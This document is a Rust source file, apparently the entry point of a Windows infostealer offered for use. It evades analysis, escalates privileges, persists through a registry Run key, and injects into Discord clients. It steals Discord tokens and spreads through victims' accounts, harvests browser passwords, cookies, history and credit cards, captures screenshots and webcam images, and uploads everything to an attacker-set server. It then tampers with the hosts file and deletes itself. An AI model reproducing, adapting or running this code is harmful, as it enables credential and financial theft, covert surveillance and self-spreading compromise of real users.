#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(dead_code)] // This is for constants.rs giving tons of dead code warnings
mod anti_analysis;
mod browser;
mod constants;
mod crypto;
mod discord;
mod utils;
use nokhwa::{query_devices, Camera, CaptureAPIBackend};
use reqwest::blocking::multipart;
use screenshots::Screen;
use std::{
    alloc::Layout,
    ffi::{c_void, CString},
    fs,
    path::{Path, PathBuf},
    process,
};
use winapi::um::{
    handleapi::CloseHandle,
    processthreadsapi::{GetCurrentProcess, OpenProcessToken},
    securitybaseapi::GetTokenInformation,
    shellapi::ShellExecuteA,
    winnt::{TokenElevation, KEY_WRITE, TOKEN_ELEVATION, TOKEN_QUERY},
    winreg::HKEY_CURRENT_USER,
    winuser::SW_HIDE,
};
use winreg::RegKey;

fn capture_screenshot(save_path: &PathBuf) -> bool {
    if let Some(screens) = Screen::all() {
        if screens.len() == 0 {
            return false;
        }

        match screens[0].capture() {
            Some(image) => {
                let buffer = image.buffer();
                fs::write(&save_path, &buffer).unwrap();
            }
            None => return false,
        };
    }

    true
}

fn capture_webcam_image(save_path: &PathBuf) -> bool {
    let cameras = match query_devices(CaptureAPIBackend::Auto) {
        Ok(cameras) => cameras,
        Err(_) => return false,
    };

    if cameras.len() == 0 {
        return false;
    }

    let mut camera = Camera::new(0, None).unwrap();
    camera.open_stream().unwrap();

    fs::write(&save_path, camera.frame_raw().unwrap()).unwrap();
    camera.stop_stream().unwrap();

    true
}

unsafe fn is_elevated() -> bool {
    let mut handle = std::ptr::null_mut();
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut handle);

    let size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
    let mut return_length = 0;

    let elevation = std::alloc::alloc(Layout::new::<TOKEN_ELEVATION>());
    GetTokenInformation(
        handle,
        TokenElevation,
        elevation as *mut c_void,
        size,
        &mut return_length,
    );

    let elevation_struct: TOKEN_ELEVATION = *(elevation as *mut TOKEN_ELEVATION);

    if !handle.is_null() {
        CloseHandle(handle);
    }

    elevation_struct.TokenIsElevated == 1
}

fn main() {
    // Method to detect analysis environment
    anti_analysis::detect();

    unsafe {
        if constants::SITE_BLOCKER && !is_elevated() {
            if let Some(executable_path) = std::env::current_exe().unwrap().as_os_str().to_str() {
                let lp_operation = CString::new("runas").unwrap();
                let lp_file = CString::new(executable_path).unwrap();

                ShellExecuteA(
                    std::ptr::null_mut(),
                    lp_operation.as_ptr(),
                    lp_file.as_ptr(),
                    std::ptr::null(),
                    std::ptr::null(),
                    SW_HIDE,
                );
                process::exit(0);
            }
        }
    }

    if constants::TRACE_TOKEN {
        // Infects discord clients
        discord::infect_clients(constants::WEBHOST);
    }

    let temp_env = std::env::temp_dir();

    let mut form = multipart::Form::new().text("title", "Information stolen");

    let client = reqwest::blocking::Client::new();

    if constants::COPY_TO_TEMP {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let path = Path::new("SOFTWARE")
            .join("Microsoft")
            .join("Windows")
            .join("CurrentVersion")
            .join("Run");
        let key = hkcu.open_subkey_with_flags(&path, KEY_WRITE).unwrap();

        let executable_path = std::env::current_exe().unwrap();

        if let Some(file_name) = executable_path.file_name() {
            let temp_env = std::env::var("TEMP").unwrap();
            let mut new_path = Path::new(temp_env.as_str()).join(file_name);
            new_path.set_extension("exe");

            fs::copy(&executable_path, &new_path).unwrap();
            key.set_value(file_name, &new_path.as_os_str()).unwrap();
        }
    }

    if constants::STEAL_TOKENS {
        let mut tokens = discord::get_tokens();

        // Removes invalid tokens (might get rate limited from discord idk)
        for i in 0..tokens.len() {
            // Gets user data from the token using discord API
            let user_response = client
                .get("https://discord.com/api/users/@me")
                .header("Authorization", &tokens[i])
                .send()
                .unwrap();

            if !user_response.status().is_success() {
                tokens.remove(i);
            } else if constants::AUTO_SPREAD {
                discord::auto_spread(&tokens[i], &constants::AUTO_SPREAD_MESSAGE);
            }
        }

        // If there are any tokens add the first token info to the post request
        if let Some(token) = tokens.first() {
            let user_response = client
                .get("https://discord.com/api/users/@me")
                .header("Authorization", token)
                .send()
                .unwrap();
            form = form.text("user", user_response.text().unwrap());

            // Adds the tokens to the request as a text file
            let tokens_temp_path = temp_env.join("tokens.txt");
            fs::write(&tokens_temp_path, tokens.join("\n")).unwrap();
            form = form.file("tokens", &tokens_temp_path).unwrap();
            fs::remove_file(tokens_temp_path).unwrap();
        }
    }

    if constants::STEAL_PASSWORDS {
        // Adds the passwords to the request as a text file
        let passwords_temp_path = temp_env.join("passwords.txt");
        fs::write(&passwords_temp_path, browser::get_passwords().join("\n")).unwrap();
        form = form.file("passwords", &passwords_temp_path).unwrap();
        fs::remove_file(passwords_temp_path).unwrap();
    }

    if constants::STEAL_COOKIES {
        // Adds the cookies to the request as a text file
        let cookies_temp_path = temp_env.join("cookies.txt");
        fs::write(&cookies_temp_path, browser::get_cookies().join("\n")).unwrap();
        form = form.file("cookies", &cookies_temp_path).unwrap();
        fs::remove_file(cookies_temp_path).unwrap();
    }

    if constants::STEAL_HISTORY {
        // Adds the browsing history to the request as a text file
        let history_temp_path = temp_env.join("history.txt");
        fs::write(&history_temp_path, browser::get_history().join("\n")).unwrap();
        form = form.file("history", &history_temp_path).unwrap();
        fs::remove_file(history_temp_path).unwrap();
    }

    if constants::STEAL_CREDIT_CARDS {
        // Adds the credit cards to the request as a text file
        let credit_cards_temp_path = temp_env.join("credit_cards.txt");
        fs::write(
            &credit_cards_temp_path,
            browser::get_credit_cards().join("\n"),
        )
        .unwrap();
        form = form.file("credit_cards", &credit_cards_temp_path).unwrap();
        fs::remove_file(credit_cards_temp_path).unwrap();
    }

    if constants::SCREENSHOT {
        // Adds the screenshot to the request if it succeeds
        let screenshot_temp_path = temp_env.join("screenshot.png");

        if capture_screenshot(&screenshot_temp_path) {
            form = form.file("screenshot", &screenshot_temp_path).unwrap();
            fs::remove_file(screenshot_temp_path).unwrap();
        }
    }

    if constants::WEBCAM_IMAGE {
        // Adds the webcam image to the request if it succeeds
        let webcam_temp_path = temp_env.join("webcam.png");

        if capture_webcam_image(&webcam_temp_path) {
            form = form.file("webcam", &webcam_temp_path).unwrap();
            fs::remove_file(webcam_temp_path).unwrap();
        }
    }

    // Sends the stolen data to the backend
    client
        .post(constants::WEBHOST)
        .multipart(form)
        .send()
        .unwrap();

    if constants::SITE_BLOCKER {
        for site in constants::SITES_TO_BLOCK {
            fs::write(
                obfstr::obfstr!("C:\\Windows\\System32\\drivers\\etc\\hosts"),
                format!("0.0.0.0 {}", site),
            )
            .unwrap();
        }
    }

    if constants::SELF_DELETE {
        if let Some(executable_path) = std::env::current_exe().unwrap().as_path().to_str() {
            let lp_file = CString::new("cmd").unwrap();
            let lp_parameters = CString::new(format!(
                "/C choice /C Y /N /D Y /T 3 & del {}",
                executable_path
            ))
            .unwrap();

            unsafe {
                ShellExecuteA(
                    std::ptr::null_mut(),
                    std::ptr::null(),
                    lp_file.as_ptr(),
                    lp_parameters.as_ptr(),
                    std::ptr::null(),
                    SW_HIDE,
                );
            }
        }
    }
}
